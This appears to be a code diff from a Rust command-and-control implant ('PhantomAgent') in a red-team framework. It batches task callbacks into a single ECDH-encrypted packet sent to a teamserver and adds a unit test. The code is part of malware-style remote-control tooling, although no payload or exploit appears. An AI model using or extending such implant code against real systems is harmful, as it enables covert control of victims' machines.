@@ -7,13 +7,30 @@ use crate::command::{PendingCallback, execute};
 use crate::error::PhantomError;
 use crate::protocol::{build_callback_packet, callback_ctr_blocks};
 
+/// Build a [`DemonPackage`] for each callback in order (single ECDH `DemonMessage` batch).
+fn demon_packages_for_callbacks(
+    callbacks: Vec<PendingCallback>,
+) -> Result<Vec<DemonPackage>, PhantomError> {
+    let mut out = Vec::with_capacity(callbacks.len());
+    for callback in callbacks {
+        let payload = callback.payload()?;
+        out.push(DemonPackage {
+            command_id: callback.command_id(),
+            request_id: callback.request_id(),
+            payload,
+        });
+    }
+    Ok(out)
+}
+
 impl PhantomAgent {
     /// Send a `COMMAND_CHECKIN` heartbeat, then fetch and dispatch queued tasks
     /// with a separate `COMMAND_GET_JOB` request.
     ///
     /// When an ECDH session is active, this sends a single combined session packet
-    /// containing both `CommandCheckin` and `CommandGetJob`, then routes any pending
-    /// callbacks as individual ECDH session packets (one per callback).
+    /// containing both `CommandCheckin` and `CommandGetJob`, then sends each task’s
+    /// callback batch as one ECDH session packet (one `seq` + one `DemonMessage`
+    /// that may contain several packages, e.g. `CommandProc` + `CommandOutput`).
     ///
     /// Without ECDH, mirrors Specter's two-request pattern: the teamserver's
     /// `handle_checkin` returns no task bytes, so tasks must be fetched via a
@@ -72,7 +89,7 @@ impl PhantomAgent {
 
     /// ECDH-mode checkin: combines checkin + get_job into one encrypted session packet.
     async fn ecdh_checkin(&mut self) -> Result<bool, PhantomError> {
-        // First flush any pending callbacks as individual ECDH session packets.
+        // First flush any pending callbacks as a batched ECDH session packet.
         self.ecdh_flush_pending_callbacks().await?;
 
         // Send [CommandCheckin, CommandGetJob] in one session packet.
@@ -92,35 +109,29 @@ impl PhantomAgent {
         let mut exit_requested = false;
         for package in job_message.packages {
             execute(&package, &mut self.config, &mut self.state).await?;
-            for callback in self.state.drain_callbacks() {
-                let payload = callback.payload()?;
-                let callback_pkg = DemonPackage {
-                    command_id: callback.command_id(),
-                    request_id: callback.request_id(),
-                    payload,
-                };
-                let resp = self.ecdh_send_packages(vec![callback_pkg]).await?;
-                let _ = resp; // server response to a callback is informational only
-                if matches!(callback, PendingCallback::Exit { .. }) {
+            let callbacks = self.state.drain_callbacks();
+            for c in &callbacks {
+                if matches!(c, PendingCallback::Exit { .. }) {
                     exit_requested = true;
                 }
+            }
+            if !callbacks.is_empty() {
+                let pkgs = demon_packages_for_callbacks(callbacks)?;
+                let _ = self.ecdh_send_packages(pkgs).await?;
             }
         }
 
         Ok(exit_requested)
     }
 
-    /// Flush pending callbacks over ECDH (one session packet per callback).
+    /// Flush pending callbacks over ECDH (one session packet; one `DemonMessage` for the batch).
     async fn ecdh_flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
-        for callback in self.state.drain_callbacks() {
-            let payload = callback.payload()?;
-            let pkg = DemonPackage {
-                command_id: callback.command_id(),
-                request_id: callback.request_id(),
-                payload,
-            };
-            let _resp = self.ecdh_send_packages(vec![pkg]).await?;
+        let callbacks = self.state.drain_callbacks();
+        if callbacks.is_empty() {
+            return Ok(());
         }
+        let pkgs = demon_packages_for_callbacks(callbacks)?;
+        let _ = self.ecdh_send_packages(pkgs).await?;
         Ok(())
     }
 
@@ -145,5 +156,29 @@ impl PhantomAgent {
         }
 
         Ok(())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use red_cell_common::demon::DemonCommand;
+
+    use super::demon_packages_for_callbacks;
+    use crate::command::PendingCallback;
+
+    #[test]
+    fn callback_batch_bundles_proc_then_output_in_order() {
+        let callbacks = vec![
+            PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandProc),
+                request_id: 7,
+                payload: vec![0xab, 0xcd],
+            },
+            PendingCallback::Output { request_id: 7, text: "batch-out".to_string() },
+        ];
+        let pkgs = demon_packages_for_callbacks(callbacks).expect("packages");
+        assert_eq!(pkgs.len(), 2);
+        assert_eq!(pkgs[0].command_id, u32::from(DemonCommand::CommandProc));
+        assert_eq!(pkgs[1].command_id, u32::from(DemonCommand::CommandOutput));
     }
 }
